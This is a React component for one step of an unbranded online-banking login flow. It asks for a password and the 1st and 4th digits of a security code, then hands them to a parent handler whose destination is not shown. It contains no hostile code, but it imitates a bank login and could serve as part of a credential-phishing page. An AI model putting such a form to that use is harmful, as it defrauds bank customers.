import React, { useState } from 'react';
import { ArrowLeft } from 'lucide-react';

interface CredentialsStepProps {
  onBack: () => void;
  onSubmit: (data: {
    password: string;
    securityCode1: string;
    securityCode4: string;
  }) => void;
}

export function CredentialsStep({ onBack, onSubmit }: CredentialsStepProps) {
  const [formData, setFormData] = useState({
    password: '',
    securityCode1: '',
    securityCode4: '',
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(formData);
  };

  return (
    <form onSubmit={handleSubmit} className="w-full max-w-md">
      <button
        type="button"
        onClick={onBack}
        className="flex items-center text-blue-600 mb-6 hover:underline"
      >
        <ArrowLeft className="w-4 h-4 mr-1" />
        Back
      </button>

      <h2 className="text-2xl font-semibold mb-6">Log in to online banking</h2>
      
      <div className="mb-6">
        <label htmlFor="password" className="block text-gray-700 text-lg mb-2">
          Password
        </label>
        <input
          type="password"
          id="password"
          value={formData.password}
          onChange={(e) => setFormData(prev => ({ ...prev, password: e.target.value }))}
          className="w-full px-4 py-3 rounded border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500"
          required
        />
      </div>

      <div className="mb-6">
        <label className="block text-gray-700 text-lg mb-2">
          Security code
        </label>
        <p className="text-sm text-gray-600 mb-4">
          Enter the 1st and 4th digit of your 6-digit security code:
        </p>
        <div className="flex gap-4">
          <div>
            <label htmlFor="code1" className="block text-sm font-medium text-gray-600 mb-1">
              1st
            </label>
            <input
              type="text"
              id="code1"
              maxLength={1}
              value={formData.securityCode1}
              onChange={(e) => setFormData(prev => ({ ...prev, securityCode1: e.target.value }))}
              className="w-16 px-4 py-3 rounded border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
            />
          </div>
          <div>
            <label htmlFor="code4" className="block text-sm font-medium text-gray-600 mb-1">
              4th
            </label>
            <input
              type="text"
              id="code4"
              maxLength={1}
              value={formData.securityCode4}
              onChange={(e) => setFormData(prev => ({ ...prev, securityCode4: e.target.value }))}
              className="w-16 px-4 py-3 rounded border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500"
              required
            />
          </div>
        </div>
      </div>

      <div className="mb-6">
        <a href="#" className="text-blue-600 hover:underline">
          Forgotten your log in details?
        </a>
      </div>

      <button
        type="submit"
        className="w-32 bg-blue-600 text-white py-3 px-6 rounded font-medium hover:bg-blue-700 transition-colors"
      >
        Continue
      </button>
    </form>
  );
}